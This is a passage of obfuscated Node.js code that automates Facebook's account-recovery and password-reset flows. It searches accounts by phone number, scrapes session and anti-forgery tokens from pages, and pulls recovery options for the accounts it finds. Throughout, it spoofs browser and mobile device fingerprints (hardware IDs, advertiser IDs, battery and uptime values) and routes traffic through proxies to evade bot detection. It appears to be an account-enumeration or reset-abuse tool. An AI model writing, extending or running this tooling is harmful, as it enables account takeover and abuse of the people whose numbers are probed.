"gLLskXaWLLJ4SyaNa5kARQykx2RGOHGbJGVE8KUGVpKiry2V8PQHCBy99ay29tvsBbKAniqROaVftjpalcBkBGut0QwPwCwLHgKi9xe4ecyZQu2ibm78bE-EmwgVE5LUGEmwkEjBxefwcC12wCCig2mgG0DUoyFm0hefxe12w3K80HB7jUF00nEo0Gq0ZV80Vm11FDy403ne0rai022-00-Ipjw2Do1Ji00pAo0hW80qZ06EzAEsguS02eC00CC82hw1gG04Eohe0T98bp81O84604TUfo0mZ85oKcw", v811 = v793.__s || '');
  let v812, v813, v814;
  if (v800) v812 = v808 ? "gdug4AI4bJ1nV9k6UZJoIwEo1hoaoandxd0iEbV43q17oW1EwBgIkws2MbwZ4gKqcyEa8p8iE7el283Eg9E1ro5S0o20gu012tw3BU0we" : v793.__hsdp_code || (v793.__hsdp && !v793.__hsdp.startsWith(':') ? v793.__hsdp : v806), v813 = v793.__hblp_code || (v793.__hblp && !v793.__hblp.startsWith(':') ? v793.__hblp : v807), v814 = v808 ? "gdugbih4JMWXxyql1K68pwn61uw8-3O17wuo9kb5870I80mQh1acwPxAx87O0hG0mS" : v793.__sjsp_code || (v793.__sjsp && !v793.__sjsp.startsWith(':') ? v793.__sjsp : "gdxgCxLgs8Bf3jK742OewoS3m0iG0wGx3Hb1WgawlEug2bwiE");else v801 ? (v812 = v808 ? "gdug4AJMWXxy2C0zS2C2BP0963O17wuo9E35goz8cUp8i1SzU0DW1tw60w47w0gDo0Vu083w" : v804, v813 = v805, v814 = v808 ? "gdugbih4JMWXxy2C0zS0XEf84u1VwCwcl1ycwPxAx80Mm" : "gdxgCxLgs8Bf3jK742OewoS3m0iG0wGx3Hb1WgawlEug2bw") : (v812 = v808 ? "gdug4AJMWXxy2C0zS2C2BP0960_E9E3vz8cUp8i1SzU0JO0o20gu012tw3BU0we" : v793.__hsdp && !v793.__hsdp.startsWith(':') ? v793.__hsdp : "gdxght1MykYde0Mm2SV4cc0hq0wGjy-1ra0cZwce0qS01a4w3aU0wq", v813 = v793.__hblp && !v793.__hblp.startsWith(':') ? v793.__hblp : "0d60h-0pSUS1ug2qw6Wwxwno6uq0L81uocU421xwi8aE1cE0TW0ddw0ByyE1eU1XU0wq1wxK68b82ow2R80MG2Scwjo1t81bo", v814 = v808 ? "gdugbih4JMWXxy2C0zS0XE3-wCwd-cwPxAx8" : v793.__sjsp && !v793.__sjsp.startsWith(':') ? v793.__sjsp : v802);
  const v815 = (v793.__req++).toString(0x24),
    v816 = new URLSearchParams();
  v816.set('av', '0'), v816.set("__aaid", '0'), v816.set("__user", '0'), v816.set("__a", '1'), v816.set("__req", v815), v816.set("__hs", v793.__hs || "20710.HYP:comet_loggedout_pkg.2.1...0"), v816.set("dpr", '1'), v816.set("__ccg", v793.__ccg || "EXCELLENT"), v816.set("__rev", v793.rev || "1047458801"), v816.set("__s", v811), v816.set("__hsi", v793.hsi), v816.set("__dyn", v809), v816.set("__csr", v810);
  if (v812) v816.set("__hsdp", v812);
  if (v813) v816.set("__hblp", v813);
  if (v814) v816.set("__sjsp", v814);
  v816.set("__comet_req", v793.__comet_req || '15'), v816.set("lsd", v793.lsd), v816.set("jazoest", v793.jazoest);
  if (v793.fb_dtsg) v816.set("fb_dtsg", v793.fb_dtsg);
  v816.set("__spin_r", v793.rev || "1047458801"), v816.set("__spin_b", v793.spinB || "trunk"), v816.set("__spin_t", v793.spinT || String(Math.floor(Date.now() / 0x3e8))), v816.set("__crn", v800 ? "comet.fbweb.CometCAAARCodeEntryRoute" : v801 ? "comet.fbweb.CometCAAARInitiateViewRoute" : "comet.fbweb.CometCAAAccountSearchRoute");
  return v816.set("qpl_active_flow_ids", "516759801"), v816.set("fb_api_caller_class", "RelayModern"), v816.set("fb_api_req_friendly_name", v795), v816.set("server_timestamps", "true"), v816.set("variables", JSON.stringify(v796)), v816.set("doc_id", v794), v816.set("fb_api_analytics_tags", JSON.stringify(["qpl_active_flow_ids=516759801"])), v816;
}
function buildHeaders(v817, v818, v819, v820, v821) {
  const v822 = v818 || globalUA,
    v823 = v820 || getLanguageHeader(SELECTED_ACCEPT_LANG) || "en-US,en;q=0.9",
    v824 = v821 || "https://www.facebook.com/login/identify/",
    v825 = v822.browserType === "firefox" || v822.browserType === "firefox_linux" || SELECTED_BROWSER === "firefox";
  if (v825) {
    const v830 = {};
    v830["User-Agent"] = v822.userAgent, v830.Accept = "*/*", v830["Accept-Language"] = v823, v830["Accept-Encoding"] = "gzip, deflate, br", v830["Content-Type"] = "application/x-www-form-urlencoded", v830["X-FB-Friendly-Name"] = v819 || "unknown";
    const v831 = v830;
    if (v817.uplSessionId) v831["X-FB-UPL-SESSIONID"] = v817.uplSessionId;
    if (v817.flowSessionId) v831["X-BH-FLOWSESSIONID"] = v817.flowSessionId;
    return v831["X-FB-LSD"] = v817.lsd, v831["X-ASBD-ID"] = "359341", v831.Origin = "https://www.facebook.com", v831["Alt-Used"] = "www.facebook.com", v831.Connection = "keep-alive", v831.Referer = v824, v831.Cookie = v817.cookieHeader, v831["Sec-Fetch-Dest"] = "empty", v831["Sec-Fetch-Mode"] = "cors", v831["Sec-Fetch-Site"] = "same-origin", v831.Priority = "u=0", v831.TE = "trailers", v831;
  }
  const v826 = Object.fromEntries(Object.entries(v822.clientHints || {}).filter(([v832]) => v832 !== "sec-gpc")),
    v827 = {
      'Accept': "*/*",
      'Accept-Encoding': "gzip, deflate, br",
      'Accept-Language': v823,
      'Content-Type': "application/x-www-form-urlencoded",
      'Cookie': v817.cookieHeader,
      'Origin': "https://www.facebook.com",
      'Priority': "u=1, i",
      'Referer': v824,
      ...v826,
      'sec-fetch-dest': "empty",
      'sec-fetch-mode': "cors",
      'sec-fetch-site': "same-origin",
      ...(v822.clientHints && v822.clientHints["sec-gpc"] ? {
        'sec-gpc': v822.clientHints["sec-gpc"]
      } : {}),
      'User-Agent': v822.userAgent,
      'X-ASBD-ID': "359341",
      ...(v817.flowSessionId ? {
        'x-bh-flowsessionid': v817.flowSessionId
      } : {}),
      'X-FB-Friendly-Name': v819 || "unknown",
      'X-FB-LSD': v817.lsd,
      ...(v817.uplSessionId ? {
        'x-fb-upl-sessionid': v817.uplSessionId
      } : {})
    };
  const v828 = v827,
    v829 = v822.device;
  if (v829) {
    if (v829.platform === "android") {
      v828["x-fb-device-model"] = v829.model || '', v828["x-fb-device-os-version"] = v829.androidVersion ? v829.androidVersion + ".0.0" : '', v828["x-fb-device-battery-level"] = String(v829.battery), v828["x-fb-device-battery-state"] = v829.isCharging ? "charging" : "discharging", v828["x-fb-device-uptime"] = String(v829.uptime), v828["x-fb-device-fg-time"] = String(v829.fgTime), v828["x-fb-device-hwid"] = v829.hwid || '', v828["x-fb-device-boot-id"] = v829.bootId || '', v828["x-fb-device-advertiser-id"] = v829.advertisingId || '', v828["x-fb-device-session-id"] = v829.sessionId || '', v828["x-fb-device-conn-type"] = v829.connType || "WIFI", v828["x-fb-device-net-quality"] = v829.networkQuality || "EXCELLENT", v828["x-fb-device-bandwidth"] = String(v829.bandwidth || 0x0), v828["x-fb-device-sim-operator"] = v829.simOperator || '', v828["x-fb-device-ram"] = String((v829.ram || 0x4) * 0x400), v828["x-fb-device-gpu"] = v829.gpu || '', v828["x-fb-device-cpu"] = v829.cpu || '', v828["x-fb-device-soc"] = v829.socManufacturer || '', v828["x-fb-device-group"] = v829.deviceGroup || "medium";
      if (v829.gpsVersion) v828["x-fb-device-gps-version"] = v829.gpsVersion;
    } else {
      if (v829.platform === "ios") {
        {
          v828["x-fb-device-model"] = v829.model || '';
          v828["x-fb-device-os-version"] = v829.osVersion || v829.iosVersion && v829.iosVersion.osTag || '';
          v828["x-fb-device-battery-level"] = String(v829.battery);
          v828["x-fb-device-battery-state"] = v829.isCharging ? "charging" : "discharging";
          v828["x-fb-device-uptime"] = String(v829.uptime);
          v828["x-fb-device-fg-time"] = String(v829.fgTime);
          v828["x-fb-device-hwid"] = v829.hwid || '';
          v828["x-fb-device-boot-id"] = v829.bootId || '';
          v828["x-fb-device-advertiser-id"] = v829.advertisingId || '';
          v828["x-fb-device-session-id"] = v829.sessionId || '';
          v828["x-fb-device-conn-type"] = v829.connType || "WIFI";
          v828["x-fb-device-net-quality"] = v829.networkQuality || "EXCELLENT";
          v828["x-fb-device-bandwidth"] = String(v829.bandwidth || 0x0);
          v828["x-fb-device-sim-operator"] = v829.simOperator || '';
          v828["x-fb-device-ram"] = String((v829.ram || 0x6) * 0x400);
          v828["x-fb-device-gpu"] = v829.gpu || '';
          v828["x-fb-device-cpu"] = v829.cpu || '';
          v828["x-fb-device-soc"] = v829.socManufacturer || "Apple";
          v828["x-fb-device-group"] = v829.deviceGroup || "high";
          v828["x-fb-device-family"] = v829.family || "iPhone";
        }
      }
    }
  }
  return v828;
}
function bloksPostPage(v833, v834, v835, v836 = 0x3a98, v837 = "m.facebook.com", v838 = undefined, v839 = null, v840 = null) {
  const v841 = v837 || "m.facebook.com",
    v842 = v838 === undefined ? getProxy() : v838,
    v843 = v839 || globalUA;
  const v844 = v840 || "https://" + v841 + "/login/identify/",
    v845 = {};
  v845["X-Requested-With"] = "mark.via.gp";
  const v846 = {
    'Accept': "*/*",
    'Accept-Encoding': "gzip, deflate, br",
    'Accept-Language': v839 && v839.hostCtx ? v839.hostCtx.lang : "en-GB,en-US;q=0.9,en;q=0.8",
    'Content-Type': "application/x-www-form-urlencoded;charset=UTF-8",
    'Cookie': v835,
    'User-Agent': v843.userAgent,
    'Referer': v844,
    'Origin': "https://" + v841,
    ...(SELECTED_BROWSER === "via_browser" ? v845 : {}),
    ...(v843.clientHints || {})
  };
  v846["sec-fetch-dest"] = "empty", v846["sec-fetch-mode"] = "cors", v846["sec-fetch-site"] = "same-origin", v846.Priority = "u=1, i";
  const v847 = v846;
  if (v842) {
    const v848 = {};
    return v848.hostname = v841, v848.path = v833, v848.method = "POST", v848.headers = v847, proxyHttpsRequest(v842, v848, v834, v836).then(v849 => {
      if (v849.status >= 0x12c && v849.status < 0x190 && v849.location) {
        const v851 = {};
        return v851.status = v849.status, v851.redirect = v849.location, v851.headers = v849.headers, v851;
      }
      const v850 = {};
      v850.status = v849.status;
      v850.data = v849.data;
      return v850.headers = v849.headers, v850;
    });
  }
  return new Promise((v852, v853) => {
    v847["Content-Length"] = Buffer.byteLength(v834);
    const v854 = {};
    v854.keepAlive = false;
    const v855 = {
        'hostname': v841,
        'port': 0x1bb,
        'path': v833,
        'method': "POST",
        'timeout': v836,
        'agent': new https.Agent(v854),
        'headers': v847
      },
      v856 = https.request(v855, v857 => {
        const v858 = [];
        v857.on("data", v859 => {
          v858.push(v859);
          trackBytes(v859.length);
        }), v857.on("error", v860 => {
          try {
            v853(v860);
          } catch (v861) {}
        });
        v857.on("end", () => {
          if (v857.statusCode >= 0x12c && function (v864, v865) {
            return v864 < v865;
          }(v857.statusCode, 0x190) && v857.headers.location) {
            const v866 = {};
            return v866.status = v857.statusCode, v866.redirect = v857.headers.location, v866.headers = v857.headers, v852(v866);
          }
          let v862 = Buffer.concat(v858);
          const v863 = v857.headers["content-encoding"];
          if (v863 === "gzip") try {
            v862 = zlib.gunzipSync(v862);
          } catch (v867) {} else {
            if (v863 === "deflate") try {
              v862 = zlib.inflateSync(v862);
            } catch (v868) {} else {
              if (v863 === 'br') try {
                v862 = zlib.brotliDecompressSync(v862);
              } catch (v869) {}
            }
          }
          v852({
            'status': v857.statusCode,
            'data': v862.toString(),
            'headers': v857.headers
          });
        });
      });
    v856.on("error", v853);
    v856.on("timeout", () => {
      v856.destroy(), v853(new Error("timeout"));
    }), v856.write(v834);
    v856.end();
  });
}
function mfbParsedResponse(v870) {
  if (!v870) return null;
  let v871 = v870.replace(/^for\s*\(;;\);/, '');
  try {
    return JSON.parse(v871);
  } catch (v872) {
    return null;
  }
}
function mfbExtractRid(v873) {
  try {
    return v873 && v873.payload && v873.payload.id ? v873.payload.id : v873 && v873.rid ? v873.rid : null;
  } catch (v874) {
    return null;
  }
}
function mfbExtractContextData(v875) {
  if (!v875) return null;
  const v876 = v875.match(/\\?["']context_data\\?["']\s*:\s*\\?["'](Ad[A-Za-z0-9_\-+/]{40,}\|arm)\\?["']/);
  if (v876) return v876[0x1];
  const v877 = v875.match(/\\?["']password\\?["']\s*,\s*true\s*,\s*\\?["'][A-Za-z0-9_\-+/]{40,}\\?["']\s*,\s*\\?["'](Ad[A-Za-z0-9_\-+/]{40,}\|arm)\\?["']/);
  if (v877) return v877[0x1];
  const v878 = v875.match(/\\?["']context_data\\?["'][\s\S]{1,1200}?\\?["'](Ad[A-Za-z0-9_\-+/]{40,}\|arm)\\?["']/i);
  if (v878) return v878[0x1];
  const v879 = v875.match(/auth_option_selection[\s\S]{1,3000}?\\?["'](Ad[A-Za-z0-9_\-+/]{40,}\|arm)\\?["']/i);
  if (v879) return v879[0x1];
  const v880 = [...v875.matchAll(/\\?["'](Ad[A-Za-z0-9_\-+/]{40,}\|arm)\\?["']/g)];
  for (const v881 of v880) {
    const v882 = v881.index,
      v883 = v875.substring(Math.max(0x0, v882 - 0x28), v882);
    if (!/ar_context/i.test(v883)) return v881[0x1];
  }
  return null;
}
function mfbExtractAuthMethodRecoveryData(v884) {
  if (!v884) return null;
  const v885 = v884.match(/\\?["']password\\?["']\s*,\s*true\s*,\s*\\?["']([A-Za-z0-9_\-+/]{40,})\\?["']\s*,\s*\\?["'](Ad[A-Za-z0-9_\-+/]{40,}\|arm)\\?["']/);
  if (v885) return {
    'asyncParams': v885[0x1],
    'contextData': v885[0x2]
  };
  const v886 = v884.match(/auth_method_async_params[\s\S]{1,1200}?\\?["']([A-Za-z0-9_\-+/]{40,})\\?["'][\s\S]{1,1200}?\\?["'](Ad[A-Za-z0-9_\-+/]{40,}\|arm)\\?["']/i);
  if (v886) return {
    'asyncParams': v886[0x1],
    'contextData': v886[0x2]
  };
  const v887 = mfbExtractContextData(v884);
  if (v887) return {
    'asyncParams': null,
    'contextData': v887
  };
  return null;
}
function mfbExtractAuthOptionContextData(v888, v889 = "phone") {
  if (!v888) return null;
  const v890 = v889.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"),
    v891 = new RegExp("\\\\?[\"']" + v890 + "\\\\?[\"'][\\s\\S]{1,3000}?auth_option_selection[\\s\\S]{1,3000}?\\\\?[\"'](Ad[A-Za-z0-9_\\-+/]{40,}\\|arm)\\\\?[\"']", 'i');
  const v892 = v888.match(v891);
  if (v892) return v892[0x1];
  const v893 = /auth_option_selection[\s\S]{1,3000}?\\?["'](Ad[A-Za-z0-9_\-+/]{40,}\|arm)\\?["']/i;
  const v894 = v888.match(v893);
  if (v894) return v894[0x1];
  return mfbExtractContextData(v888);
}
function mfbExtractCuid(v895) {
  if (!v895) return null;
  const v896 = v895.match(/cuid[\s\S]{1,120}?(AY[A-Za-z0-9_\-]{40,})/i);
  if (v896) return v896[0x1];
  const v897 = v895.match(/(?:push_screen_BloksCAAAccountRecoveryAuthMethodController|AuthMethodController)[\s\S]{1,250}?(AY[A-Za-z0-9_\-]{40,})/i);
  if (v897) return v897[0x1];
  const v898 = v895.match(/\b(AY[A-Za-z0-9_\-]{150,})\b/);
  if (v898) return v898[0x1];
  return null;
}
function mfbExtractWaterfall(v899) {
  if (!v899) return null;
  const v900 = v899.match(/\\?["']waterfall_id\\?["']\s*[,:]\s*\\?["']([a-f0-9\-]{36})\\?["']/i) || v899.match(/funnel_id=([a-f0-9\-]{36})/i) || v899.match(/\\?["']waterfall\\?["']\s*[,:]\s*\\?["']([a-f0-9\-]{36})\\?["']/i);
  return v900 ? v900[0x1] : null;
}
function mfbExtractSerializedStates(v901) {
  if (!v901) return null;
  const v902 = v901.match(/\\?["']is_loading\\?["'][\s\S]{1,250}?\\?["'](2;[A-Za-z0-9_]+;0)\\?["']/);
  if (v902) {
    const v908 = {};
    return v908.is_loading = v902[0x1], v908;
  }
  const v903 = v901.match(/\(bk\.action\.array\.Make,\s*\\?["'](2;[A-Za-z0-9_]{6,25};0)\\?["']\)/);
  if (v903) {
    const v909 = {};
    return v909.is_loading = v903[0x1], v909;
  }
  const v904 = v901.match(/\\?["'](2;[A-Za-z0-9_]{6,25};0)\\?["']/);
  if (v904) {
    const v910 = {};
    return v910.is_loading = v904[0x1], v910;
  }
  const v905 = v901.match(/WriteLocalState[,\s\\]+["']([A-Za-z0-9_]{6,25})["'][,\s]+true/);
  if (v905) {
    const v911 = {};
    return v911.is_loading = '2;' + v905[0x1] + ';0', v911;
  }
  const v906 = v901.match(/\\?["']id\\?["']\s*:\s*\\?["']([A-Za-z0-9_]{6,25})\\?["']\s*,\s*\\?["']type\\?["']\s*:\s*\\?["']ls\\?["']\s*,\s*\\?["']data\\?["']\s*:\s*\{\s*\\?["']initial\\?["']\s*:\s*false/);
  if (v906) {
    const v912 = {};
    return v912.is_loading = '2;' + v906[0x1] + ';0', v912;
  }
  const v907 = v901.match(/"serialized_states"\s*:\s*(\{[^}]+\})/) || v901.match(/"serialized_states",\s*"(\{.+?\})"/);
  if (v907) try {
    return JSON.parse(v907[0x1].replace(/\\"/g, '\x22'));
  } catch (v913) {}
  return null;
}
function mfbExtractAuthOptions(v914) {
  if (!v914) return null;
  const v915 = v914.match(/auth_options[\s\S]{1,1500}?\(bk\.action\.array\.Make(?:,\s*([^)]*))?\)/i) || v914.match(/\(bk\.action\.array\.Make,\s*("(?:whatsapp|phone|email|password)"[^)]*)\)/i);
  if (v915) {
    if (!v915[0x1] || !v915[0x1].trim()) return [];
    const v917 = [...v915[0x1].matchAll(/["']([a-z0-9_]+)["']/gi)].map(v918 => v918[0x1]);
    return v917;
  }
  if (/auth_options[\s\S]{1,1500}?\(bk\.action\.array\.Make\)/i.test(v914)) return [];
  const v916 = v914.match(/["']auth_options["']\s*:\s*(\[[^\]]*\])/);
  if (v916) try {
    return JSON.parse(v916[0x1]);
  } catch (v919) {}
  return null;
}
function mfbBaseParams(v920) {
  v920.__reqCounter = (v920.__reqCounter || 0x0) + 0x1;
  const fn18 = () => Math.random().toString(0x24).substring(0x2, 0x8);
  return {
    '__aaid': '0',
    '__user': '0',
    '__a': '1',
    '__req': v920.__reqCounter.toString(0x24),
    '__hs': v920.__hs || "20710.BP:wbloks_caa_pkg.2.0...0",
    'dpr': '3',
    '__ccg': "EXCELLENT",
    '__rev': v920.__rev || v920.rev || "1047458801",
    '__s': v920.__s || fn18() + ':' + fn18() + ':' + fn18(),
    '__hsi': v920.hsi || '',
    '__dyn': v920.__dyn || "0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x67o1g8hw23E52q1ew2io0D24o1MUaE1Do1u81x82ewnE3fwww5NyE25w8W0Lo6-0Co1kU1bo8Xw8S0QU3yw",
    'fb_dtsg': v920.fb_dtsg || '',
    'jazoest': v920.jazoest || '',
    'lsd': v920.lsd || ''
  };
}
function mfbFormEncode(v921) {
  return Object.entries(v921).map(([v922, v923]) => encodeURIComponent(v922) + '=' + encodeURIComponent(v923)).join('&');
}
const MFB_DEBUG_ENABLED = false,
  MFB_DEBUG_LOG = path.join(__dirname, "reset_mfb_debug.txt");
function mfbLog(v924, v925) {
  if (!MFB_DEBUG_ENABLED) return;
  const v926 = '[' + new Date().toISOString() + "] [" + v924 + ']\x20' + v925 + '\x0a';
  try {
    fs.appendFileSync(MFB_DEBUG_LOG, v926);
  } catch (v927) {}
}
function mfbSaveRaw(v928, v929) {
  if (!MFB_DEBUG_ENABLED) return;
  const v930 = '\x0a' + '─'.repeat(0x3c) + "\n[RAW RESPONSE] " + v928 + '\x0a' + '─'.repeat(0x3c) + '\x0a';
  try {
    fs.appendFileSync(MFB_DEBUG_LOG, v930 + (v929 || "(empty)") + '\x0a');
  } catch (v931) {}
}
async function mfbBloksPost(v932, v933, v934, v935, v936, v937, v938) {
  const v939 = v935.bkv || "826d6c3c1a72a6fa0b96aa7c1224a28df91a313c8e4179f035ab64dba4a16670",
    v940 = "/async/wbloks/fetch/?appid=" + encodeURIComponent(v932) + "&type=" + encodeURIComponent(v933 || "action") + "&__bkv=" + v939;
  const v941 = mfbBaseParams(v935),
    v942 = mfbFormEncode({
      ...v941,
      'params': JSON.stringify({
        'params': JSON.stringify(v934)
      })
    }),
    v943 = {};
  v943.lang = v938 || "en-US,en;q=0.9";
  const v944 = {
    ...(v937 || globalUA)
  };
  v944.hostCtx = v943;
  const v945 = v944,
    v946 = await bloksPostPage(v940, v942, v935.cookieHeader, 0x4e20, "m.facebook.com", v936, v945, "https://m.facebook.com/login/identify/");
  if (!v946 || !v946.data) return null;
  if (v946.headers) mergeCookiesIntoStr(v935, v946.headers);
  return {
    'raw': v946.data,
    'parsed': mfbParsedResponse(v946.data),
    'status': v946.status,
    'headers': v946.headers
  };
}
function mergeCookiesIntoStr(v947, v948) {
  const v949 = v948 && (v948["set-cookie"] || v948["Set-Cookie"]);
  if (!v949) return;
  const v950 = {};
  (v947.cookieHeader || '').split(';').forEach(v951 => {
    const v952 = v951.indexOf('=');
    if (v952 < 0x0) return;
    v950[v951.slice(0x0, v952).trim()] = v951.slice(v952 + 0x1).trim();
  });
  (Array.isArray(v949) ? v949 : [v949]).forEach(v953 => {
    const v954 = v953.split(';')[0x0].split('=');
    if (v954.length >= 0x2) {
      const v955 = v954[0x0].trim(),
        v956 = v954.slice(0x1).join('=').trim();
      if (v956 !== "deleted" && v956 !== '') {
        v950[v955] = v956;
        if (v955 === "datr" || v955 === "_js_datr") v947.datr = v956;
      }
    }
  }), v947.cookieHeader = Object.entries(v950).map(([v957, v958]) => v957 + '=' + v958).join(';\x20');
}
async function mfbBootstrap(v959, v960, v961) {
  const v962 = mfbGenIosUA();
  mfbLog("BOOTSTRAP", "Fetching m.facebook.com session tokens... [UA: " + v962.slice(0x0, 0x3c) + "...]");
  const v963 = {};
  v963.cookieHeader = '', v963.fb_dtsg = null;
  v963.lsd = null;
  v963.jazoest = null, v963.__rev = null, v963.__hs = null, v963.hsi = null, v963.datr = null;
  v963.bkv = "826d6c3c1a72a6fa0b96aa7c1224a28df91a313c8e4179f035ab64dba4a16670", v963.contextData = null, v963.phoneContextData = null, v963.serializedStatesObj = null, v963.loisToken = null, v963.waterfall = null;
  const v964 = v963;
  try {
    const v965 = {};
    let v966 = "m.facebook.com",
      v967 = "/login/identify/",
      v968 = '',
      v969 = 0x0;
    for (let v979 = 0x0; v979 < 0x4; v979++) {
      const v980 = Object.entries(v965).map(([v987, v988]) => v987 + '=' + v988).join(';\x20'),
        v981 = {};
      v981["User-Agent"] = v962, v981.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", v981["Accept-Language"] = v961 || "en-US,en;q=0.9", v981["Accept-Encoding"] = "gzip, deflate, br", v981["sec-fetch-dest"] = "document", v981["sec-fetch-mode"] = "navigate", v981["sec-fetch-site"] = "none";
      const v982 = v981;
      if (v980) v982.Cookie = v980;
      let v983;
      if (v959) {
        const v989 = {};
        v989.hostname = v966, v989.path = v967, v989.method = "GET", v989.headers = v982, v983 = await proxyHttpsRequest(v959, v989, null, 0x3a98);
      } else v983 = await new Promise((v990, v991) => {
        const v992 = {};
        v992.hostname = v966, v992.port = 0x1bb;
        v992.path = v967, v992.method = "GET";
        v992.timeout = 0x3a98, v992.headers = v982;
        const v993 = https.request(v992, v994 => {
          const v995 = [];
          v994.on("data", v996 => v995.push(v996)), v994.on("end", () => {
            let v997 = Buffer.concat(v995);
            const v998 = v994.headers["content-encoding"];
            try {
              if (v998 === "gzip") v997 = zlib.gunzipSync(v997);else {
                if (v998 === 'br') v997 = zlib.brotliDecompressSync(v997);
              }
            } catch (v999) {}
            v990({
              'status': v994.statusCode,
              'headers': v994.headers,
              'data': v997.toString(),
              'location': v994.headers.location || ''
            });
          });
          v994.on("error", v991);
        });
        v993.on("error", v991), v993.on("timeout", () => {
          v993.destroy(), v991(new Error("mfb bootstrap timeout"));
        }), v993.end();
      });
      v969 = v983.status, v968 = v983.data || '';
      const v984 = v983.headers && (v983.headers["set-cookie"] || v983.headers["Set-Cookie"]);
      v984 && (Array.isArray(v984) ? v984 : [v984]).forEach(v1000 => {
        const v1001 = v1000.split(';')[0x0].split('=');
        if (v1001.length >= 0x2) {
          const v1002 = v1001[0x0].trim(),
            v1003 = v1001.slice(0x1).join('=').trim();
          if (v1003 !== "deleted" && v1003 !== '') {
            v965[v1002] = v1003;
            if (v1002 === "datr" || v1002 === "_js_datr") v964.datr = v1003;
          }
        }
      });
      const v985 = v983.status >= 0x12c && v983.status < 0x190,
        v986 = v983.location || v983.headers && v983.headers.location || '';
      if (v985 && v986) {
        mfbLog("BOOTSTRAP", "HTTP " + v983.status + " → redirect to " + v986.slice(0x0, 0x3c) + "... (hop " + (v979 + 0x1) + ')');
        try {
          const v1004 = new URL(v986.startsWith("http") ? v986 : "https://" + v966 + v986);
          v966 = v1004.hostname, v967 = v1004.pathname + v1004.search;
        } catch (v1005) {
          v967 = v986;
        }
        continue;
      }
      break;
    }
    mfbLog("BOOTSTRAP", "HTTP " + v969 + " | " + v968.length + " bytes"), mfbSaveRaw("BOOTSTRAP", v968);
    if (!v964.datr) {
      const v1006 = v968.match(/datr["\s]*:["\s]*"([^"]+)"/) || v968.match(/_js_datr["\s]*,["\s]*"([^"]+)"/) || v968.match(/"_js_datr"\s*:\s*"([^"]+)"/) || v968.match(/["']datr["']\s*:\s*["']([^"']{20,})["']/) || v968.match(/["']datr["']\s*,\s*["']([^"']{20,})["']/) || v968.match(/document\.cookie\s*=\s*["'](?:_js_)?datr=([^;'"\s]+)/) || v968.match(/["']device_id["']\s*:\s*"([A-Za-z0-9_-]{24})"/);
      if (v1006) v964.datr = v1006[0x1];
    }
    !v964.datr && (v964.datr = crypto.randomBytes(0x12).toString("base64").replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, ''), mfbLog("BOOTSTRAP", "datr generated (deferred): " + v964.datr));
    v964.datr && (v965.datr = v964.datr);
    if (!v965.wd) v965.wd = "390x844";
    if (!v965.dpr) v965.dpr = '3';
    if (!v965.m_pixel_ratio) v965.m_pixel_ratio = '3';
    const v970 = v968.match(/"dtsg"\s*:\s*\{\s*"token"\s*:\s*"([^"]+)"/) || v968.match(/fb_dtsg[^"]*"([^"]{20,})"/);
    if (v970) v964.fb_dtsg = v970[0x1];
    const v971 = v968.match(/"LSD"[^\]]*\[\][^{]*\{[^}]*"token":\s*"([^"]+)"/) || v968.match(/"lsd"\s*:\s*"([^"]+)"/);
    if (v971) {
      v964.lsd = v971[0x1];
      let v1007 = 0x0;
      for (let v1008 = 0x0; v1008 < v971[0x1].length; v1008++) v1007 += v971[0x1].charCodeAt(v1008);
      v964.jazoest = '2' + v1007;
    }
    const v972 = v968.match(/"__rev"\s*:\s*(\d+)/) || v968.match(/"server_revision"\s*:\s*(\d+)/) || v968.match(/"__spin_r"\s*:\s*(\d+)/) || v968.match(/"revision":(\d+)/) || v968.match(/"consistency":\s*\{[^}]*"rev":\s*(\d+)/) || v968.match(/consistency[^}]*rev["\s]*:\s*(\d+)/);
    if (v972) v964.__rev = v972[0x1];
    const v973 = v968.match(/"haste_session"\s*:\s*"([^"]+)"/) || v968.match(/"__hs"\s*:\s*"([^"]+)"/);
    if (v973) v964.__hs = v973[0x1];
    const v974 = v968.match(/"__s"\s*:\s*"([^"]+)"/) || v968.match(/"s"\s*:\s*"([^"]+)"/),
      fn19 = () => Math.random().toString(0x24).substring(0x2, 0x8);
    v964.__s = v974 ? v974[0x1] : fn19() + ':' + fn19() + ':' + fn19();
    const v975 = v968.match(/"__dyn"\s*:\s*"([^"]+)"/);
    if (v975) v964.__dyn = v975[0x1];
    const v976 = mfbExtractWaterfall(v968);
    if (v976) v964.waterfall = v976;
    const v977 = mfbExtractContextData(v968);
    if (v977) v964.contextData = v977;
    const v978 = v968.match(/"__hsi"\s*:\s*"?(\d+)"?/) || v968.match(/"hsi"\s*:\s*"(\d+)"/);
    if (v978) v964.hsi = v978[0x1];
    v964.cookieHeader = Object.entries(v965).map(([v1009, v1010]) => v1009 + '=' + v1010).join(';\x20'), mfbLog("BOOTSTRAP", "fb_dtsg   : " + (v964.fb_dtsg ? v964.fb_dtsg.slice(0x0, 0x1e) + "..." : "NOT FOUND")), mfbLog("BOOTSTRAP", "lsd       : " + (v964.lsd || "NOT FOUND")), mfbLog("BOOTSTRAP", "jazoest   : " + (v964.jazoest || "NOT FOUND")), mfbLog("BOOTSTRAP", "__rev     : " + (v964.__rev || "NOT FOUND")), mfbLog("BOOTSTRAP", "__hs      : " + ((v964.__hs || '').slice(0x0, 0x28) || "NOT FOUND")), mfbLog("BOOTSTRAP", "__s       : " + (v964.__s || "NOT FOUND")), mfbLog("BOOTSTRAP", "waterfall : " + (v964.waterfall || "NOT FOUND")), mfbLog("BOOTSTRAP", "datr      : " + (v964.datr ? v964.datr.slice(0x0, 0x14) + "..." : "NOT FOUND")), mfbLog("BOOTSTRAP", "cookies   : " + v964.cookieHeader.slice(0x0, 0x3c) + "...");
  } catch (v1011) {
    mfbLog("BOOTSTRAP", "FAILED: " + v1011.message);
  }
  return v964;
}
async function mfbSearch(v1012, v1013, v1014, v1015, v1016) {
  const v1017 = v1012.replace(/^\+/, '');
  mfbLog("SEARCH", "Searching: " + v1017);
  const v1018 = v1013.waterfall || uuid();
  v1013.waterfall = v1018;
  const v1019 = {};
  v1019.lois_token = '';
  const v1020 = {
      'server_params': {
        'event_request_id': uuid(),
        'INTERNAL__latency_qpl_marker_id': 0x2301b43,
        'INTERNAL__latency_qpl_instance_id': String(Date.now()) + "113",
        'device_id': v1013.datr || null,
        'family_device_id': null,
        'waterfall_id': v1018,
        'offline_experiment_group': null,
        'layered_homepage_experiment_group': null,
        'is_platform_login': 0x0,
